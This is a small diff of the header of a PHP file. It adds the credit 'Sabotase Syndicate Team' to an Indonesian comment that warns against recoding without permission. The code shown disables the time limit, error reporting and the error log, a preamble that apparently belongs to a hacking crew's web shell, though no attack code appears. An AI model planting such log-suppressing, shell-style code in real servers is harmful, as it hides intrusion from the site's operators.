@@ -1,7 +1,8 @@
 
 
 <?php 
-/* Mau recode? izin dulu, recode ga izin itu ga keren ajg */
+/* Mau recode? izin dulu, recode ga izin itu ga keren ajg
+Sabotase Syndicate Team   */
 set_time_limit(0);
 error_reporting(0);
 @ini_set('error_log', null);
